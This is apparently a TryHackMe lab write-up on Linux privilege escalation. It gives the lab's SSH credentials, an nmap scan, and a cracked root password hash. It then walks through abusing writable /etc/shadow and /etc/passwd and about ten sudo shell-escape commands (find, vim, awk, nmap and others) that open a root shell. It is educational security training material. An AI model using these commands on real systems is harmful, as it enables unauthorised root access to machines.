 # TryHackMe
## Linux privEsc room 

### Target Ip Adresss
 
**10.10.104.17**


connect through it with ssh using 

``ssh user@10.10.104.17``

password: `password321`


```
user account: user@debian
id: uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

nmap scan result 

```
hown: 993 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp   open     smtp    Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-8-166-103.eu-west-1.compute.internal [10.8.166.103], SIZE 52428800, 8BITMIME, PIPELINING, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP 
80/tcp   open     http    Apache httpd 2.2.16 ((Debian))
|_http-server-header: Apache/2.2.16 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open     rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      58810/tcp   mountd
|   100005  1,2,3      59744/udp   mountd
|   100021  1,3,4      51633/tcp   nlockmgr
|   100021  1,3,4      56680/udp   nlockmgr
|   100024  1          50010/udp   status
|_  100024  1          60676/tcp   status
2049/tcp open     nfs     2-4 (RPC #100003)
5050/tcp filtered mmcc
8080/tcp open     http    nginx 1.6.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.6.2
|_http-title: Welcome to nginx on Debian!
```

### Weak File Permissions - Read/Writable /etc/shadow
 

As Shadow file is read and writeable so,
 
Using Shadow found root user password Hash

`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

crack it using `john` with wordlist file `rockyou.txt`

so we found hash type is `sha512crypt`
and the password is "password123"

so we can login into root user with that password using command 
`su root`

As shadow file writable so we can generate new hash using command 
`mkpasswd -m sha-512 {newpasswordhere}`
after successfully generate hash place it to the hash place login with password that you use to generate hash 


### Weak File Permissions - Writable /etc/passwd


As passwd file is writable so we use this and generate password hash with the command 
`openssl passwd {NewPasswordHere}`

After the replace the password hash that you generated into "x" singn in passwd file 
Then you can login into root user with that password that you use to generate hash 
#### Allternative
Copy the root user line and append it with the end of the file and change root with newroot and replace the hash with "x" sign in passwd file 
Now to change the user into newroot with that password that you use to generate hash  


### Sudo - Shell Escape Sequences 


list programs which sudo allows your user to run using command 

`sudo -l`

In my target user they are 
```
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

that command are allow to Target user

Using the link: https://gtfobins.github.io/  
GTFObins list if we found the command in that list that sudo allow on the user we can gain root shell with only Escape sequence mention in GTFObins list 

So now try gain root shell of all the command that sudo allow on my target user using GTFObins list 

1) iftop
Command: ```sudo iftop
!/bin/sh```

write that command and we foung root shell

2) find 
Command: `sudo find . -exec /bin/sh \; -quit`

write that command and we foung root shell

3) nano
To esclate the privilege using nano first use command "sudo nano"
After that when nano text editor is open press "ctrl+r" and after that press "ctrl+x" 
Then type `reset; sh 1>&0 2>&0` and press enter and you have root shell NOTE: type without double qotation marks (")

4) vim 
Command: `sudo vim -c ':!/bin/sh'`
Write that command and you gain root access
5)man 
Commands:
        ``` sudo man man
         !/bin/sh```
use this commands to gain root access

6) awk 

Command:` sudo awk 'BEGIN {system("/bin/sh")}'`

Write that command and you gain root access

7) less 
Commands: ```less /etc/profile
          !/bin/sh```

use this command to gain root access

8) ftp
Commands:
        ``` ftp
         !/bin/sh ```
use this command to gain root privilege

9) nmap
Commands: 
```sudo nmap --interactive
nmap> !sh
```
use this command to gain root access

10) more
Commands: 
        ``` TERM= sudo more /etc/profile
         !/bin/sh```
use this commands to gain root access

These are all the command that are allow target user account and with the help of GTFObins we successfully gain root access 

one command are allow on target user account but there exploit not found in GTFObins and they are 
 `apache2`

# TO Be Continued...
